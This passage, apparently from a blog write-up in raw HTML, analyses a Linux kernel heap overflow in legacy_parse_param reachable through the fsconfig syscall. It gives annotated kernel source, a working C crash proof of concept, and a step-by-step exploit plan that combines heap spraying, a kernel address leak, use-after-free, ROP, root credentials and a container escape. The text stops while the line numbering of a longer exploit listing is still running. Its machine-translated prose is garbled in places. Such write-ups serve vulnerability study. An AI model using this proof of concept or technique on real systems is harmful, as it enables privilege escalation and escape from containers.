class="code"><pre><span class="line">// &gt;&gt;&gt; source/fs/fs_context.c:502</span><br><span class="line">/* 502 */ static int legacy_parse_param(struct fs_context *fc, struct fs_parameter *param)</span><br><span class="line">/* 503 */ &#123;</span><br><span class="line">/* 504 */ struct legacy_fs_context *ctx = fc-&gt;fs_private;</span><br><span class="line">/* 505 */ unsigned int size = ctx-&gt;data_size; // size は現在のバッファの長さ</span><br><span class="line">/* 506 */ size_t len = 0;</span><br><span class="line">------</span><br><span class="line">/* 521 */ switch (param-&gt;type) &#123;</span><br><span class="line">/* 522 */ case fs_value_is_string: // 型が文字列の場合</span><br><span class="line">/* 523 */ len = 1 + param-&gt;size; // lenはユーザーから渡されたデータのサイズ + 1</span><br><span class="line">------</span><br><span class="line">/* 533 */ if (len &gt; PAGE_SIZE - 2 - size) // 整数のオーバーフロー</span><br><span class="line">/* 534 */ return invalf(fc, &quot;VFS: Legacy: Cumulative options too large&quot;);</span><br><span class="line">------</span><br><span class="line">/* 540 */ if (!ctx-&gt;legacy_data) &#123;</span><br><span class="line">    // バッファが存在しない場合、PAGE_SIZE のサイズでメモリを確保する。</span><br><span class="line">    // PS. ここでは、GFP_KERNEL を使用していますが、実際には、GFP_KERNEL_ACCOUNT を使用する方が理にかなっています。</span><br><span class="line">    // この問題は5.16で修正されました。</span><br><span class="line">    // bb902cb47cf93b33cd92b3b7a4019330a03ef57f</span><br><span class="line">/* 541 */ ctx-&gt;legacy_data = kmalloc(PAGE_SIZE, GFP_KERNEL);</span><br><span class="line">/* 542 */ if (!ctx-&gt;legacy_data)</span><br><span class="line">/* 543 */ return -ENOMEM;</span><br><span class="line">/* 544 */ &#125;</span><br><span class="line">/* 545 */</span><br><span class="line">/* 546 */ ctx-&gt;legacy_data[size++] = &#x27;,&#x27;; // append &#x27;,&#x27;</span><br><span class="line">/* 547 */ len = strlen(param-&gt;key);</span><br><span class="line">/* 548 */ memcpy(ctx-&gt;legacy_data + size, param-&gt;key, len); // copy key_string</span><br><span class="line">/* 549 */ size += len;</span><br><span class="line">------</span><br><span class="line">/* 550 */ if (param-&gt;type == fs_value_is_string) &#123;</span><br><span class="line">/* 551 */ ctx-&gt;legacy_data[size++] = &#x27;=&#x27;; // append &#x27;=&#x27;</span><br><span class="line">/* 552 */ memcpy(ctx-&gt;legacy_data + size, param-&gt;string, param-&gt;size); // copy</span><br><span class="line">/* 553 */ size += param-&gt;size;</span><br><span class="line">/* 554 */ &#125;</span><br><span class="line">/* 555 */ ctx-&gt;legacy_data[size] = &#x27;\0&#x27;; // append &#x27;\x00&#x27;</span><br><span class="line">/* 556 */ ctx-&gt;data_size = size;</span><br><span class="line">/* 557 */ ctx-&gt;param_type = LEGACY_FS_INDIVIDUAL_PARAMS;</span><br><span class="line">/* 558 */ return 0;</span><br><span class="line">/* 559 */ &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>偶然の一致がある。</p><p>ctx-&gt;legacy_dataのサイズはPAGE_SIZEであり、新しいカーネルバージョンではCONFIG_HARDENED_USERCOPYが有効なので、552行目でcopy_from_userが使われると、コピーしたバッファがオブジェクト内にあるか、ページにまたがっているか、などのチェックが行われることになります。 これではクラッシュホールになってしまう。</p><p>しかし、ここではparam-&gt;stringは実際にはstrndup_user経由でカーネルにコピーされている（これはまだcopy_from_user）ので、これはカーネルからコアへのコピーであり、config_HARDENED_USERCOPYチェックをバイパスするmemcpyを使えば十分です！（※）。 (笑</p><p>次に、コールチェーンについて一言。</p><p>この機能は、ユーザー状態からsyscallfsconfigを介して起動させることができます。</p><p>コールチェーンは以下の通りです。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">// &gt;&gt;&gt; source/fs/fsopen.c:314</span><br><span class="line">/* 314 */ SYSCALL_DEFINE5(fsconfig,</span><br><span class="line">/* 315 */ int, fd,</span><br><span class="line">/* 316 */ unsigned int, cmd,</span><br><span class="line">/* 317 */ const char __user *, _key,</span><br><span class="line">/* 318 */ const void __user *, _value,</span><br><span class="line">/* 319 */ int, aux)</span><br><span class="line">/* 320 */ &#123;</span><br><span class="line">------</span><br><span class="line">/* 326 */ struct fs_parameter param = &#123;</span><br><span class="line">/* 327 */ .type= fs_value_is_undefined,</span><br><span class="line">/* 328 */ &#125;;</span><br><span class="line">------</span><br><span class="line">/* 383 */ if (_key) &#123;</span><br><span class="line">    // 调用strndup_user，填充param.key</span><br><span class="line">/* 384 */ param.key = strndup_user(_key, 256);</span><br><span class="line">------</span><br><span class="line">/* 390 */</span><br><span class="line">/* 391 */ switch (cmd) &#123;</span><br><span class="line">------</span><br><span class="line">/* 395 */ case FSCONFIG_SET_STRING:</span><br><span class="line">        // 设置type到 fs_value_is_string</span><br><span class="line">/* 396 */ param.type = fs_value_is_string;</span><br><span class="line">        // 调用strndup_user，填充param.string</span><br><span class="line">/* 397 */ param.string = strndup_user(_value, 256);</span><br><span class="line">------</span><br><span class="line">/* 402 */ param.size = strlen(param.string);</span><br><span class="line">/* 403 */ break;</span><br><span class="line">------</span><br><span class="line">    // 进这里</span><br><span class="line">/* 439 */ ret = vfs_fsconfig_locked(fc, cmd, &amp;param);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">// &gt;&gt;&gt; ../ubuntu_5.10/ubuntu-hirsute/fs/fsopen.c:216</span><br><span class="line">/* 216 */ static int vfs_fsconfig_locked(struct fs_context *fc, int cmd,</span><br><span class="line">/* 217 */        struct fs_parameter *param)</span><br><span class="line">/* 218 */ &#123;</span><br><span class="line">------</span><br><span class="line">/* 225 */ switch (cmd) &#123;</span><br><span class="line">------</span><br><span class="line">/* 260 */ default:</span><br><span class="line">------</span><br><span class="line">    // 进这里</span><br><span class="line">/* 265 */ return vfs_parse_fs_param(fc, param);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// &gt;&gt;&gt; ../ubuntu_5.10/ubuntu-hirsute/fs/fs_context.c:98</span><br><span class="line">/*  98 */ int vfs_parse_fs_param(struct fs_context *fc, struct fs_parameter *param)</span><br><span class="line">/*  99 */ &#123;</span><br><span class="line">------</span><br><span class="line">/* 116 */ if (fc-&gt;ops-&gt;parse_param) &#123;</span><br><span class="line">    // 进这里</span><br><span class="line">/* 117 */ ret = fc-&gt;ops-&gt;parse_param(fc, param);</span><br><span class="line"></span><br><span class="line">// 通过调试，这里的fc-&gt;ops-&gt;parse_param 指向 `legacy_parse_param`</span><br><span class="line">// fc-&gt;ops 为 legacy_fs_context_ops</span><br><span class="line">    </span><br><span class="line">// `legacy_parse_param` 就是这次漏洞出现的函数</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="脆弱性POC"><a href="#脆弱性POC" class="headerlink" title="脆弱性POC"></a>脆弱性POC</h5><p>ここでは、簡単なクラッシュポックを紹介します。</p><p>これらの2つのシステムコールはCAP_SYS_ADMINを必要としますが、新しい名前空間へのunshareの助けを借りて、これを行うことができることに注意してください。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;sys/syscall.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sched.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">#ifndef __NR_fsconfig</span><br><span class="line">#define __NR_fsconfig 431</span><br><span class="line">#endif</span><br><span class="line">#ifndef __NR_fsopen</span><br><span class="line">#define __NR_fsopen 430</span><br><span class="line">#endif</span><br><span class="line">#define FSCONFIG_SET_STRING 1</span><br><span class="line">#define fsopen(name, flags) syscall(__NR_fsopen, name, flags)</span><br><span class="line">#define fsconfig(fd, cmd, key, value, aux) syscall(__NR_fsconfig, fd, cmd, key, value, aux)</span><br><span class="line"></span><br><span class="line">void init_unshare() &#123;</span><br><span class="line">    int fd;</span><br><span class="line">    char buff[0x100];</span><br><span class="line"></span><br><span class="line">    // strace from `unshare -Ur xxx`</span><br><span class="line">    unshare(CLONE_NEWNS | CLONE_NEWUSER);</span><br><span class="line"></span><br><span class="line">    fd = open(&quot;/proc/self/setgroups&quot;, O_WRONLY);</span><br><span class="line">    snprintf(buff, sizeof(buff), &quot;deny&quot;);</span><br><span class="line">    write(fd, buff, strlen(buff));</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    fd = open(&quot;/proc/self/uid_map&quot;, O_WRONLY);</span><br><span class="line">    snprintf(buff, sizeof(buff), &quot;0 %d 1&quot;, getuid());</span><br><span class="line">    write(fd, buff, strlen(buff));</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    fd = open(&quot;/proc/self/gid_map&quot;, O_WRONLY);</span><br><span class="line">    snprintf(buff, sizeof(buff), &quot;0 %d 1&quot;, getgid());</span><br><span class="line">    write(fd, buff, strlen(buff));</span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(void) &#123;</span><br><span class="line">    init_unshare();</span><br><span class="line"></span><br><span class="line">    char *val = &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;;</span><br><span class="line">    int fd = 0;</span><br><span class="line">    fd = fsopen(&quot;ext4&quot;, 0);</span><br><span class="line">    if (fd &lt; 0) &#123;</span><br><span class="line">        perror(&quot;fsopen&quot;);</span><br><span class="line">        exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    for (int i = 0; i &lt; 5000; i++) &#123;</span><br><span class="line">        fsconfig(fd, FSCONFIG_SET_STRING, &quot;\x00&quot;, val, 0);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="脆弱性exp"><a href="#脆弱性exp" class="headerlink" title="脆弱性exp"></a>脆弱性exp</h5><p>ヒープバッファオーバーフローはkmalloc-4kで発生し、シナリオの制限により0バイトを書き込むことができない（strdupに基づく）。</p><p>legacy_data の割り当てには GFP_KERNEL フラグが使用されるため、カーネルが 5.9 未満の場合、GFP_KERNEL_ACCOUNT のチャンクをまとめるのは不可能です。 msg_msg (GFP_KERNEL_ACCOUNT を使用して割り当てられる) を呼び出すことができます。</p><p>通常、ユーザーレベルから入力されたデータを保存する場合、チャンクの割り当てに GFP_KERNEL_ACCOUNT を使用しますが、ここで GFP_KERNEL を使用しているのは実はバグで、linux 5.16 の commit で修正されました。</p><p>msg_msg の詳細については、ここでは繰り返さない。</p><p>まずfsopenを呼び出してオーバーフローを準備します。</p><p>そして、0x1000 の struct msg_msg と 0x400 の struct msg_msgseg を含む、以下のように大量の msg が割り当てられる。</p><p><img src="/../../../img/bin/linux/01.png" alt="avatar"></p><p>その場合、legacy_data の直後に 4k の struct msg_msg があり、その struct msg_msgseg の直後に別の msg_msgseg があるようなレイアウトになる可能性があります。</p><p><img src="/../../../img/bin/linux/02.png" alt="avatar"></p><p>すると、オーバーフローが発生して m_ts が上書きされます。1つの msg_msgseg は最大で 0x1000 バイトになるため、MSG を使って “A” の msg を読もうとすると、それに続く msg_msgsegB の内容も読み取れるようになります。</p><p><img src="/../../../img/bin/linux/03.png" alt="avatar"></p><p>こうすることで、msgseg A の後に別の msgseg が続くかどうかをチェックし、続かない場合は、カーネルがクラッシュするかエクスプロイトが成功するまでヒープスプレーを再開させることができます。</p><p>その後、”A “を含むもの以外のすべてのmsgが解放されるので、この時点ではmsgseg A以降のチャンクが解放されています。 struct pipe_buffer のサイズが 0x28 で kcalloc で確保され、count が 0x10 なので、0x280 のヒープが確保され、使用フラグは GFP_KERNEL_ACCOUNT となります。 を満たしていること。</p><p>そうすると、次のようなレイアウトになる可能性が高いです。</p><p><img src="/../../../img/bin/linux/04.png" alt="avatar"></p><p>これは、msg A の oob read を行うことで、pipe_buffer の oops フィールドを漏らし、カーネルベースを得ます。</p><p>その後、すべてのpipe_bufferを解放する。 msgの別のキューを開始し、それぞれに以下のように16個の0x400のmsgを詰め込む。</p><p><img src="/../../../img/bin/linux/05.png" alt="avatar"></p><p>そうすると、高い確率で次のようなレイアウトが形成されます。 OOB リードにより、msg B のアドレスを知ることができる。この msg は、後に UAF に使用される。</p><p><img src="/../../../img/bin/linux/06.png" alt="avatar"></p><p>その後、D と D 以降のすべての msg を解放し、新しい msg X を要求すれば、X のアドレスが C の次のポインタに書き込まれます。 この msg には、偽の msg_msg、偽の pipe_buf_operations、ROP チェーンなど、後で使用されるすべてのデータが含まれています。 ここまででUAFチャンクのアドレスとカーネルベースが判明しているからです。 再度OOB読み出しを行うと、msg Xのアドレスが判明する。</p><p><img src="/../../../img/bin/linux/07.png" alt="avatar"></p><p>その後、fsopenを再呼び出し、オーバーフローを準備し、以下のように前回と同様にレイアウトを準備します。</p><p><img src="/../../../img/bin/linux/08.png" alt="avatar"></p><p>今回は、m_tsを攻撃するのではなく、m_list.nextを変更します。 ここで、0バイトを書き込めないというシナリオに制限されているので、msg B（0x400アライン）までのnextを直接変更できないことに注意してください。 そこで活躍するのが、前回のフェイクバッファーです。 msg_msg ヘッダを偽造するためにゼロでない lsb アドレスを選び、偽造された msg の次が msg B を指すようにすることができる。</p><p><img src="/../../../img/bin/linux/09.png" alt="avatar"></p><p>次に、msg Bを通常のmsgキューから取り出し、sk_buff-&gt;dataを再びヒープして、1つのsk_buff-&gt;dataがmsg Bのチャンクを占めることを期待します。</p><p>少し触れておくと、このsk_buff-&gt;dataは、ソケットのUDPに使用され、サイズは0x180〜0x1000、前面はユーザ制御可能なデータ、背面0x140はstruct skb_shared_info、確保フラグはGFP_KERNEL_ACCOUNTです。</p><p><img src="/../../../img/bin/linux/10.png" alt="avatar"></p><p>スプレーされたskbuff_dataは、struct msg_msgヘッダを偽造することで、msg_msgのUAFからskbuff_dataのUAFに変換し、msgキューを再び解放するために使用します。</p><p>次に、pile-spray pipe_buffer と skbuff_data がチャンクを共有することを期待して、skbuff_data を解放し、pipe_buffer の UAF に変換する。</p><p>そして、opsなどのpipe_bufferのデータを完全に書き換えて、カーネルripをハイジャックできるように、skbuff_dataを再びヒープスプレーします。</p><p><img src="/../../../img/bin/linux/11.png" alt="avatar"><br>鍛造されたOPSは、以前は偽物のすべてがあったチャンクに置くことができますし、ROPチェーンも同じです。 rop で smap と smep を閉じ、ユーザランドに戻って commit_creds(prepare_kernel_cred(0)) を呼び出し、権利を復活させるために switch_task_namespaces(find_task_by_vpid(1), init_nsproxy) を呼び出します。 ); ドッカーを着ること。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span 